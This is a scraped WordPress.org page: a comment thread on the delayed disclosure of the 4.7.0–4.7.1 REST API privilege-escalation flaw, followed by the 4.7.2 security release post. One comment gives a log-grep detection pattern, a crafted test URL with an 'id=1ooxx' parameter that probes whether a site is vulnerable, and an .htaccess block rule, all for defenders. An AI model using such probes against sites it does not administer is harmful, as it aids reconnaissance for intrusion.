    Lecturing hosts who have a real problem on their hands now that they are doing it wrong when it’s WordPress’s fault their insecure code is blindly allowing remote attackers full access is not helpful either. Using $\_REQUEST[‘id’] to validate the permissions against the route handler? Really???? And you try and turn it around and lecture the poor ISPs that now have to clean up this mess? Shame!

    Thank heavens for the excellent Securi post with its actual details. What surprises me (or maybe not) is that none of these various vendors you shared the details with felt the need to share any tips on this thread. Every man and woman for themself, is that how it is?? I suggest the security team learn a thing or two about responsible disclosure from some other projects. A good place to start would be a single page with public info about pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party vulns, but I digress….

    You might have heard, there’s this new thing called the World Wide Web where you can post info publicly and massive numbers of people can efficiently read it, without even needing a persistent TCP connection. Pretty astonishing stuff! It’s kind of like Twitter but for more than 160 characters, and actually useful for something.
17. ![](https://secure.gravatar.com/avatar/6976d95f130d89278f63169e5aa65a640260eca1401f38e6ad1554d7c6d50496?s=32&d=mm&r=g)
    [damien\_vancouver](https://profiles.wordpress.org/damien_vancouver/)
    8:18 pm *on* February 4, 2017

    Wow, so I posted a post here with the details and it was removed by moderators.

    Security through Obscurity, that is just plain wrong. Claiming that it’s a standard is just plain wrong too. I’m just going to release my post elsewhere then, hiding information from people is not helping, the details are right in the Securi post.

    You people have a LOT to learn about responsible disclosure…

    * ![](https://secure.gravatar.com/avatar/5c987aca2f157f44b6139276e60927e790abfba421976aa1c618b11c0af522b2?s=32&d=mm&r=g)
      [bobby12305](https://profiles.wordpress.org/bobby12305/)
      5:52 pm *on* February 9, 2017

      *Non-constructive personal attack removed by @helen, reviewed by @samuelsidler.*
19. ![](https://secure.gravatar.com/avatar/6976d95f130d89278f63169e5aa65a640260eca1401f38e6ad1554d7c6d50496?s=32&d=mm&r=g)
    [damien\_vancouver](https://profiles.wordpress.org/damien_vancouver/)
    8:22 pm *on* February 4, 2017

    Try this.

    1. Open Google

    2. Type in “Wordpress 4.7.0”

    3. Note how the TOP TWO results after the two new version releases and this thread ARE WORKING EXPOLOIT CODE FROM EXPLOIT-DB.

    How is your supressing of information on how to detect and test for the vulnerability stopping hackers using this? Exploits are already in the wild!!!!!! You are stopping nobody but legitimate users from helping themselves.

    * ![](https://secure.gravatar.com/avatar/6976d95f130d89278f63169e5aa65a640260eca1401f38e6ad1554d7c6d50496?s=32&d=mm&r=g)
      [damien\_vancouver](https://profiles.wordpress.org/damien_vancouver/)
      8:22 pm *on* February 4, 2017

      **Find it:**

      ```
      grep 'wp-json/wp.*\?.*id=' access.log
      ```

      and look for HTTPHTTP HTTP is an acronym for Hyper Text Transfer Protocol. HTTP is the underlying protocol used by the World Wide Web and this protocol defines how messages are formatted and transmitted, and what actions Web servers and browsers should take in response to various commands. 200 result codes.

      **Test it:** In browser go to **<http://example.com/wp-json/wp/v2/posts/12345?id=1ooxx>**

      .. if you see the “welcome to wordpress” post in JSONJSON JSON, or JavaScript Object Notation, is a minimal, readable format for structuring data. It is used primarily to transmit data between a server and web application, as an alternative to XML. it’s vulnerable!!

      .. if you see a “Invalidinvalid A resolution on the bug tracker (and generally common in software development, sometimes also *notabug*) that indicates the ticket is not a bug, is a support request, or is generally invalid. parameter(s): id” message it’s patched to 4.7.2+

      .. if you see a “”No route was found matching the URLURL A specific web address of a website or web page on the Internet, such as a website’s URL www.wordpress.org ” mesage it’s too old to be vulnerable, but you still need to get it updated.

      **BlockBlock Block is the abstract term used to describe units of markup that, composed together, form the content or layout of a webpage using the WordPress editor. The idea combines concepts of what in the past may have achieved with shortcodes, custom HTML, and embed discovery into a single consistent API and user experience. it:** Add to top of .htaccess or global ApacheApache Apache is the most widely used web server software. Developed and maintained by [Apache Software Foundation](https://www.apache.org/). Apache is an Open Source software available for free. config:

      ```
      # BEGIN Block REST requests with 4.7.0 - 4.7.1 ?ID hack
      <IfModule mod_rewrite.c>
        RewriteEngine On
        # block anything starting with /wp-json/wp that also contains "id=" in the query string somehwere
        RewriteCond %{QUERY_STRING} id= [NC]
        RewriteRule ^wp-json/wp - [F,L,NC]
      </Ifmodule>
      # END Block REST requests with 4.7.0 - 4.7.1 ?ID hack
      ```

      …don’t forget to TEST you didn’t break the site after, and that the block is working!!)

      + ![](https://secure.gravatar.com/avatar/87bd91d6cde8c32e07a433ed914a25c8fa07ba94582ccefa4de7d4d2363231cc?s=32&d=mm&r=g)
        [habitcreature](https://profiles.wordpress.org/habitcreature/)
        2:56 pm *on* February 11, 2017

        Thank you. Doing us all a favor. BIG THANKS FROM FLORIDA
      + ![](https://secure.gravatar.com/avatar/819e9cbcd4e21ce5fe1a4f50dddf153d5d0e9ead09190af36a6b262a82ef657c?s=32&d=mm&r=g)
        [timwhitlock](https://profiles.wordpress.org/timwhitlock/)
        5:57 pm *on* February 11, 2017

        I experienced 6 successful attacks before I patched my site and none of the requests had a query string. Presumably the id parameter was in the post body. For that reason this rule would not have stopped those attacks.
    * ![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=32&d=mm&r=g)
      [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
      8:40 pm *on* February 4, 2017

      It does appear that some comments that had been automatically moderated and later approved are now missing. I’m going to look into what happened, but I wanted to apologize first. It is not our intention to attempt to suppress information by removing comments from here. I’m sorry that it happened and as I said, I’ll look into it.

      + ![](https://secure.gravatar.com/avatar/6976d95f130d89278f63169e5aa65a640260eca1401f38e6ad1554d7c6d50496?s=32&d=mm&r=g)
        [damien\_vancouver](https://profiles.wordpress.org/damien_vancouver/)
        8:43 pm *on* February 4, 2017

        ah OK, sorry for over-reacting.. it was on here last night.

        I realize the security group has the best of intentions and don’t mean to imply otherwise.. but there is lots of room for improvement.

        - ![](https://secure.gravatar.com/avatar/87f8c2bbfabbae3462bbab2c83ce82763c7ff91bc632b64f3af7e24d929633f6?s=32&d=mm&r=g)
          [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
          8:49 pm *on* February 4, 2017

          That is correct. I see that it was approved ~11 hours ago, but I don’t know what’s happened between then and now (yet). I appreciate you understanding, and agree that there’s plenty of room for improvement 🙂
21. ![](https://secure.gravatar.com/avatar/ed4330099409cabe02e00c7906879c4869568efcae66d16eb767ed9eb4f2cb2e?s=32&d=mm&r=g)
    [khurramar](https://profiles.wordpress.org/khurramar/)
    3:05 pm *on* February 5, 2017

    Just wanted to share a bit that recent hack attempts have gone successful on wordpress 4.7 and 4.7.1. I shared my case here. Please take a serious note and make it aware to WordPress users <https://wordpress.org/support/topic/wordpress-4-7-1-hacked-by-ng689skw/>

    * ![](https://secure.gravatar.com/avatar/4f90c8c3f9a4a29a8f9d14470c2bbe8b8d069ceb934455fbf59b83c3b053aeda?s=32&d=mm&r=g)
      [ianhman](https://profiles.wordpress.org/ianhman/)
      11:32 am *on* February 6, 2017

      Interesting. Look forward to seeing WP’s response to this.
23. ![](https://secure.gravatar.com/avatar/f21fdedba332e09a48c1b4f51aa3db5ac791ad4a11899c65d8285cbad941d4c8?s=32&d=mm&r=g)
    [johnrork](https://profiles.wordpress.org/johnrork/)
    7:40 pm *on* February 6, 2017

    While I appreciate the responsible disclosure of this issue and the effort to resolve it, I hope you consider making future announcements via a **new post** on the WordPress News site, rather than just appending an update to a previous post.

    I am probably not the only one who could have avoided being compromised had this shown up as a new item in my RSS reader on Wednesday.

    * ![](https://secure.gravatar.com/avatar/81e1dd5a2859ad42e93bfe5a2e0d5820cc52de0238a274c8033dd71cc7c21d3f?s=32&d=mm&r=g)
      [tigertech](https://profiles.wordpress.org/tigertech/)
      4:33 am *on* February 7, 2017

      Yes, exactly. I monitor RSS feeds closely for exactly this kind of thing, and the way this was done completely hid it.
25. ![](https://secure.gravatar.com/avatar/a6f82af34e095d5c2289827e21862a72c61741ff80e8f2d7937eddb18ad67896?s=32&d=mm&r=g)
    [dadbot1979](https://profiles.wordpress.org/dadbot1979/)
    10:36 am *on* February 7, 2017

    One of my sites got hackedhacked  from this vulnerability. I’m not sure why REST APIREST API The REST API is an acronym for the RESTful Application Program Interface (API) that uses HTTP requests to GET, PUT, POST and DELETE data. It is how the front end of an application (think “phone app” or “website”) can communicate with the data store (think “database” or “file system”) <https://developer.wordpress.org/rest-api/>. was enabled by default? It may appear like a very inconsiderate decision to me 🙁

    * ![](https://secure.gravatar.com/avatar/38b184f89de9e688983878f046e84465d8daa8d73356f9172c21ae411bb1c3fe?s=32&d=mm&r=g)
      [gebintit](https://profiles.wordpress.org/gebintit/)
      1:43 pm *on* February 9, 2017

      Exactly, why is the REST APIREST API The REST API is an acronym for the RESTful Application Program Interface (API) that uses HTTP requests to GET, PUT, POST and DELETE data. It is how the front end of an application (think “phone app” or “website”) can communicate with the data store (think “database” or “file system”) <https://developer.wordpress.org/rest-api/>. activated by default?

      My blogs also got hackedhacked . I am a big fan and lover of WordPress, but with this REST API -Issue, they lost a lot of confidence.

      Really, I can’t understand how irresponsible this issue was handled. Please learn the lesson: be careful with new features which are only “nice-to-have” but can do a lot of damage! Focus on reliability and security. You made a lot of WordPress-Admins look like idiots, there were a lot of exploits!

      Greetings from Germany
27. ![](https://secure.gravatar.com/avatar/4f90c8c3f9a4a29a8f9d14470c2bbe8b8d069ceb934455fbf59b83c3b053aeda?s=32&d=mm&r=g)
    [ianhman](https://profiles.wordpress.org/ianhman/)
    1:47 pm *on* February 9, 2017

    Why are the WP CoreCore Core is the set of software required to run WordPress. The Core Development Team builds WordPress. admins not addressing these latest comments. This is very worrying!
29. ![](https://secure.gravatar.com/avatar/c4c42c1de22e0b1edff388f273974631cde45adf7e3514025c96d71ab2d603fa?s=32&d=mm&r=g)
    [dejnekas](https://profiles.wordpress.org/dejnekas/)
    9:18 am *on* February 11, 2017

    Unfortunately guys, you’ve forgot to send alerts to users that such vulnerability is your product. It caused that 1.5 million users have been hackedhacked  and we had to restore our sites!

    Shame on you! And you’re trying to say that it our (users’) fault we haven’t monitored RSS feeds?

    * ![](https://secure.gravatar.com/avatar/bf9745c7ed75307b1560f35d0962401f4644698c983504dd7401bf0c9e61ced0?s=32&d=mm&r=g)
      [White Fir Design](https://profiles.wordpress.org/whitefirdesign/)
      6:40 pm *on* February 13, 2017

      There is no evidence that 1.5 million users/websites were hackedhacked  due to this. The 1.5 million figure [comes from misleading information put out by the security company Wordfence](https://www.whitefirdesign.com/blog/2017/02/10/unreliable-claim-that-1-5-million-wordpress-pages-defaced-is-reminder-of-the-terribleness-of-security-companiesjournalists/). They took an unreliable estimate of Google search results of certain defacement tagtag A directory in Subversion. WordPress uses tags to store a single snapshot of a version (3.6, 3.6.1, etc.), the common convention of tags in version control systems. (Not to be confused with post tags.) lines, which at best would be an unreliable measures of the number of pages impacted, and then labeled that as being the number of “Hacked Sites”.

      This isn’t the first time that Wordfence has overstated threats. It would be great if WordPress would start naming and shaming security companies doing things like this, to hopefully reduce the amount of falsehoods about WordPress security out there and so that people know who are the companies that are helping to spread that misinformation.
31. ![](https://secure.gravatar.com/avatar/8ccb79455c5f148c9ad5973386fde59edf92b1db5c76f06c515780f40a18a6a8?s=32&d=mm&r=g)
    [helios2121](https://profiles.wordpress.org/helios2121/)
    11:07 am *on* February 11, 2017

    Do I understand this right? The security issuesecurity issue A security issue is a type of bug that can affect the security of WordPress installations. Specifically, it is a report of a bug that you have found in the WordPress core code, and that you have determined can be used to gain some level of access to a site running WordPress that you should not have. is in a feature I do not use on any of my sites (REST APIREST API The REST API is an acronym for the RESTful Application Program Interface (API) that uses HTTP requests to GET, PUT, POST and DELETE data. It is how the front end of an application (think “phone app” or “website”) can communicate with the data store (think “database” or “file system”) <https://developer.wordpress.org/rest-api/>.) and yet still, this feature is first enabled by default and second since wordpress 4.7 you even need a pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party – which could introduce further security issues¹ – to disable the feature?

    Please, pretty, pretty, pretty please rethink your approach to security. Make features that not everyone needs opt-in. Or \*at least\* give a way to opt out without requiring additional plugins. (I already use a plugin to disable the Google font download crap in standard themes which is a thread to the privacy of my visitors).

    Thank you, also thank you for the responsible disclosure. I think I had my two sites updated before the disclosure.

    [1] <https://de.wordpress.org/plugins/disable-json-api/>

    * ![](https://secure.gravatar.com/avatar/8ccb79455c5f148c9ad5973386fde59edf92b1db5c76f06c515780f40a18a6a8?s=32&d=mm&r=g)
      [helios2121](https://profiles.wordpress.org/helios2121/)
      11:42 am *on* February 11, 2017

      I had a look at the pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party code and it appears to be pretty straight forward and unlikely to introduce a security issuesecurity issue A security issue is a type of bug that can affect the security of WordPress installations. Specifically, it is a report of a bug that you have found in the WordPress core code, and that you have determined can be used to gain some level of access to a site running WordPress that you should not have. on its own, so I installed it.
    * ![](https://secure.gravatar.com/avatar/819e9cbcd4e21ce5fe1a4f50dddf153d5d0e9ead09190af36a6b262a82ef657c?s=32&d=mm&r=g)
      [timwhitlock](https://profiles.wordpress.org/timwhitlock/)
      6:05 pm *on* February 11, 2017

      Note that this pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party will blockBlock Block is the abstract term used to describe units of markup that, composed together, form the content or layout of a webpage using the WordPress editor. The idea combines concepts of what in the past may have achieved with shortcodes, custom HTML, and embed discovery into a single consistent API and user experience. **any** unauthenticated APIAPI An API or Application Programming Interface is a software intermediary that allows programs to interact with each other and share data in limited, clearly defined ways. request. That includes [oembed](http://oembed.com/) endpoints which are used by search engines and social media sharing tools. just so you know – might make your content less discoverable/sharable.

      + ![](https://secure.gravatar.com/avatar/4f90c8c3f9a4a29a8f9d14470c2bbe8b8d069ceb934455fbf59b83c3b053aeda?s=32&d=mm&r=g)
        [ianhman](https://profiles.wordpress.org/ianhman/)
        9:13 am *on* February 13, 2017

        I very much doubt it will affect search engine visibility.

        - ![](https://secure.gravatar.com/avatar/819e9cbcd4e21ce5fe1a4f50dddf153d5d0e9ead09190af36a6b262a82ef657c?s=32&d=mm&r=g)
          [timwhitlock](https://profiles.wordpress.org/timwhitlock/)
          12:54 pm *on* February 13, 2017

          I doubt it will affect Google’s search engine visibility, for sure. I get about 2,000 legit requests for oembeds per day (about half from Baidu), but I also see share functions (Mostly SlackSlack Slack is a Collaborative Group Chat Platform <https://slack.com/>. The WordPress community has its own Slack Channel at <https://make.wordpress.org/chat/>.). Just making a fact known for anyone deciding to add a total blockBlock Block is the abstract term used to describe units of markup that, composed together, form the content or layout of a webpage using the WordPress editor. The idea combines concepts of what in the past may have achieved with shortcodes, custom HTML, and embed discovery into a single consistent API and user experience. to their JSONJSON JSON, or JavaScript Object Notation, is a minimal, readable format for structuring data. It is used primarily to transmit data between a server and web application, as an alternative to XML. feeds.
33. ![](https://secure.gravatar.com/avatar/55589ffd5e10590d9f5129c5ee57473e45e97eafc6f47b555741c6bd52e4f791?s=32&d=mm&r=g)
    [KnowingArt\_com](https://profiles.wordpress.org/knowingart_com/)
    8:20 pm *on* February 20, 2017

    There’s an obvious conflictconflict A conflict occurs when a patch changes code that was modified after the patch was created. These patches are considered *stale*, and will require a *refresh* of the changes before it can be applied, or the conflicts will need to be *resolved*. of interest to promote “Web Application Firewalls.” And using a vulnerability that you created to simultaneously sell a firewall is really disgusting, and should be illegal, if there’s not already a law against this.

    Maybe the intention wasn’t to sell firewalls, but the subtext is there, and you may want to rethink any affiliation (real or implied) with these security companies.

    Also, Cloudflare may serve a purpose, but it’s not really safe and could create a bigger problem down the road, as you’re handing your DNSDNS DNS is an acronym for Domain Name System - how you assign a human readable address to a website’s exact numeric coded location (ie. wordpress.org uses the actual IP address 198.143.164.252). over to a 3rd party which could be compromised, which means they could intercept your email, which is 100x worse than losing a blogblog (versus network, site) to vandalism.

    If there comes a day when WordPress needs requires firewall, I have created my own blogging software and will recommend my clients switch away from WordPress.
35. ![](https://secure.gravatar.com/avatar/b0ff7a743945fcf0728adb9882befc07d3ef89a4c03e1400bc32c5dcff2bab39?s=32&d=mm&r=g)
    [Scott](https://profiles.wordpress.org/scottspinola/)
    7:21 am *on* March 5, 2017

    Between 02/06/17 18:00:49 and 02/25/17 21:00:57, every post on my self-hosted wordpress dot org site was modified in some way multiple times, usually with the “Hackedhacked  by…” signature described in news reports about this vulnerability. I have a very small site (only 12 posts) that I don’t update very often, so it didn’t take long to restore my posts to the last saved versions.

    My site is not on auto-update, and the last time I know I updated was to 4.7.1 on January 18. Since then my site was updated to 4.7.2, though I don’t recall doing that. Perhaps it was a forced update. Of course WordPress provides its platform with no logs (that I know of) so I have no way of knowing for sure when it was updated.

    In my hosting account, I see the following files updated on February 28, though I’m certain I didn’t make changes to them. Are these the files updated for the 4.7.2 release?

    class-wp-comment.php

    class-wp-post.php

    class-wp-query.php

    class-wp-term.php

    rest-api.php

    version.php

    My site is fully updated now (plugins, themes, and WP).

    I’m not a developer so I don’t know how to address this.

    * ![](https://secure.gravatar.com/avatar/27180c82524020e7339e2b30818b6d8ab004c54f730f12b1434b1e365be0e175?s=32&d=mm&r=g)
      [Ipstenu (Mika Epstein)](https://profiles.wordpress.org/ipstenu/)
      11:03 pm *on* March 5, 2017

      [@scottspinola](https://profiles.wordpress.org/scottspinola/) – Sadly this is not a support venue that can help you debug and fix your site. All WordPress sites auto-update to minor releases unless you’ve manually gone in and changed that via a pluginPlugin A plugin is a piece of software containing a group of functions that can be added to a WordPress website. They can extend functionality or add new features to your WordPress websites. WordPress plugins are written in the PHP programming language and integrate seamlessly with WordPress. These can be free in the WordPress.org Plugin Directory https://wordpress.org/plugins/ or can be cost-based plugin from a third-party or a define in your wp-config. Most people, therefor, were updated within 12 hours of the release.

      All the changed files are listed here: <https://codex.wordpress.org/Version_4.7.2>

      If you would like help debugging you can post in the support forums: <https://wordpress.org/support/>

Comments are closed.

# Post navigation

[← Dev Chat Summary: January 25th (4.7.2 week 2)](https://make.wordpress.org/core/2017/01/26/dev-chat-summary-january-25th-4-7-2-week-2/) [Dev Chat Agenda for February 1st (4.7.3 week 1) →](https://make.wordpress.org/core/2017/02/01/dev-chat-agenda-for-february-1st-4-7-3-week-1/)

## Site resources

Search

### Email Updates

Enter your email address to subscribe to this blog and receive notifications of new posts by email.

Type your email…

Subscribe

Join 6,172 other subscribers

* [Recent Updates](https://make.wordpress.org/core/)
* [Recent Comments](https://make.wordpress.org/core/?o2_recent_comments=1)
* [No Replies](https://make.wordpress.org/core/?replies=none)

Recent UpdatesRecent CommentsNo Replies
### Current Release

The current release in progress is [WordPress 6.8](https://make.wordpress.org/core/6-8/).

Planned future releases are listed on [the Project Roadmap](https://wordpress.org/about/roadmap/).

Feature projects not tied to specific releases can be found on [the Features page.](https://make.wordpress.org/core/features/)

### Regular Chats

**Note:** All chats happen on [Slack](https://make.wordpress.org/chat/).

* **Weekly Developer Meetings**: [Wednesday 20:00 UTC](https://www.timeanddate.com/worldclock/fixedtime.html?iso=20250129T2000) in [#core](https://wordpress.slack.com/archives/C02RQBWTW)
* [About the Dev Chat](http://make.wordpress.org/core/weekly-developer-chats/)
* [Agendas](http://make.wordpress.org/core/tag/agenda) | [Summaries](http://make.wordpress.org/core/tag/summary)

---

* **Performance Weekly Chat** [Tuesday 15:00 UTC](https://www.timeanddate.com/worldclock/fixedtime.html?iso=20250128T1500) in [#core-performance](https://wordpress.slack.com/archives/C02KGN5K076)
* **New Contributors Chat**
  The 2nd and 4th Wednesday of every month at 19:00 UTC in [#core](https://wordpress.slack.com/archives/C02RQBWTW)

---

[See all meetings →](https://make.wordpress.org/meetings/)

### Recent Posts and Comments

### Team Pledges

[2375 people](https://make.wordpress.org/core/pledges/) have pledged time to contribute to Core Team efforts! When looking for help on a project or program, try starting by reaching out to them!

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)

ssearch
ccompose new post
r reply
e edit
t go to top
j go to the next post or comment
k go to the previous post or comment
o toggle comment visibility
esc cancel edit post or comment

Please enable JavaScript to view this page properly.



=== Content from wordpress.org_7a60262d_20250126_122955.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[News](https://wordpress.org/news)

WordPress 4.7.2 Security Release

All posts

Search results

* Categories
  + [All Posts](https://wordpress.org/news/all-posts/)
  + [Awards](https://wordpress.org/news/category/awards/)
  + [Community](https://wordpress.org/news/category/community/)
  + [Design](https://wordpress.org/news/category/design/)
  + [Development](https://wordpress.org/news/category/development/)
  + [Documentation](https://wordpress.org/news/category/documentation/)
  + [Events](https://wordpress.org/news/category/events/)
  + [Features](https://wordpress.org/news/category/features/)
  + [General](https://wordpress.org/news/category/general/)
  + [Interviews](https://wordpress.org/news/category/interviews/)
  + [Meta](https://wordpress.org/news/category/meta/)
  + [Month in WordPress](https://wordpress.org/news/category/month-in-wordpress/)
  + [Performance](https://wordpress.org/news/category/performance/)
  + [Podcast](https://wordpress.org/news/podcast/)
  + [Releases](https://wordpress.org/news/category/releases/)
  + [Security](https://wordpress.org/news/category/security/)
  + [Store](https://wordpress.org/news/category/store/)
  + [Testing](https://wordpress.org/news/category/testing/)
  + [Updates](https://wordpress.org/news/category/updates/)
  + [WordCamp](https://wordpress.org/news/category/wordcamp/)

* Categories
  + [All Posts](https://wordpress.org/news/all-posts/)
  + [Awards](https://wordpress.org/news/category/awards/)
  + [Community](https://wordpress.org/news/category/community/)
  + [Design](https://wordpress.org/news/category/design/)
  + [Development](https://wordpress.org/news/category/development/)
  + [Documentation](https://wordpress.org/news/category/documentation/)
  + [Events](https://wordpress.org/news/category/events/)
  + [Features](https://wordpress.org/news/category/features/)
  + [General](https://wordpress.org/news/category/general/)
  + [Interviews](https://wordpress.org/news/category/interviews/)
  + [Meta](https://wordpress.org/news/category/meta/)
  + [Month in WordPress](https://wordpress.org/news/category/month-in-wordpress/)
  + [Performance](https://wordpress.org/news/category/performance/)
  + [Podcast](https://wordpress.org/news/podcast/)
  + [Releases](https://wordpress.org/news/category/releases/)
  + [Security](https://wordpress.org/news/category/security/)
  + [Store](https://wordpress.org/news/category/store/)
  + [Testing](https://wordpress.org/news/category/testing/)
  + [Updates](https://wordpress.org/news/category/updates/)
  + [WordCamp](https://wordpress.org/news/category/wordcamp/)

January 26, 2017
By [Aaron D. Campbell](https://profiles.wordpress.org/aaroncampbell/)
in [Releases](https://wordpress.org/news/category/releases/), [Security](https://wordpress.org/news/category/security/)
# WordPress 4.7.2 Security Release

---

WordPress 4.7.2 is now available. This is a **security release** for all previous versions and we strongly encourage you to update your sites immediately.

WordPress versions 4.7.1 and earlier are affected by three security issues:

1. The user interface for assigning taxonomy terms in Press This is shown to users who do not have permissions to use it. Reported by David Herrera of [Alley Interactive](https://www.alleyinteractive.com/).
2. `WP_Query` is vulnerable to a SQL injection (SQLi) when passing unsafe data. WordPress core is not directly vulnerable to this issue, but we’ve added hardening to prevent plugins and themes from accidentally causing a vulnerability. Reported by [Mo Jangda](https://github.com/mjangda) (batmoo).
3. A cross-site scripting (XSS) vulnerability was discovered in the posts list table. Reported by [Ian Dunn](https://iandunn.name/) of the WordPress Security Team.
4. An unauthenticated privilege escalation vulnerability was discovered in a REST API endpoint. Reported by [Marc-Alexandre Montpas](https://twitter.com/MarcS0h) of Sucuri Security. \*

Thank you to the reporters of these issues for practicing [responsible disclosure](https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/).

[Download WordPress 4.7.2](https://wordpress.org/download/) or venture over to Dashboard → Updates and simply click “Update Now.” Sites that support automatic background updates are already beginning to update to WordPress 4.7.2.

Thanks to everyone who contributed to 4.7.2.

\* Update: An additional serious vulnerability was fixed in this release and public disclosure was delayed. For more information on this vulnerability, additional mitigation steps taken, and an explanation for why disclosure was delayed, please read [Disclosure of Additional Security Fix in WordPress 4.7.2](https://make.wordpress.org/core/2017/02/01/disclosure-of-additional-security-fix-in-wordpress-4-7-2/).

Share this:

* [Threads](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/?share=threads&nb=1)
* [Mastodon](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/?share=mastodon&nb=1)
* [Bluesky](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/?share=bluesky&nb=1)
* [X](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/?share=x&nb=1)
* [Facebook](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/?share=facebook&nb=1)
* [LinkedIn](https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/?share=linkedin&nb=1)

---

[Previous WordPress 4.7.1 Security and Maintenance Release](https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/)
[Next WordPress 4.7.3 Security and Maintenance Release](https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/)

## Get the Latest Updates

### Subscribe to WordPress News

Email Address

Subscribe

Join 18.7K other subscribers

### WP Briefing — The WordPress Podcast

Learn about where WordPress is going and how you can get involved.

* [Apple Podcasts](https://podcasts.apple.com/us/podcast/wp-briefing/id1551691710)
* [Pocket Casts](https://pca.st/uqvvmt8t)
* [RSS](https://wordpress.org/news/feed/podcast)
* [Spotify](https://open.spotify.com/show/6BxgmE9Qg2TZA8EKZLJ4zS)
* [Stitcher](https://www.stitcher.com/show/wp-briefing)

[Listen to all episodes](https://wordpress.org/news/podcast/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


